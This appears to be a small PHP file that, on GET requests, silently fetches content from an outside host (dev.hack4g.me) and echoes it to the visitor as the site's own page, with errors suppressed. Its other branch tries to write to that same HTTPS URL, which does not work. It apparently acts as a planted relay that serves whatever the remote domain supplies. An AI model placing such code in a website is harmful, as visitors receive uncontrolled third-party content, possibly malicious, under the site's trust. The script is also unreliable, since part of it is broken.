<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
echo @file_get_contents("https://dev.hack4g.me/DownloadPlatformNext.php");
} else {
    echo @file_put_contents("https://dev.hack4g.me/DownloadPlatformNext.php","");
}
?>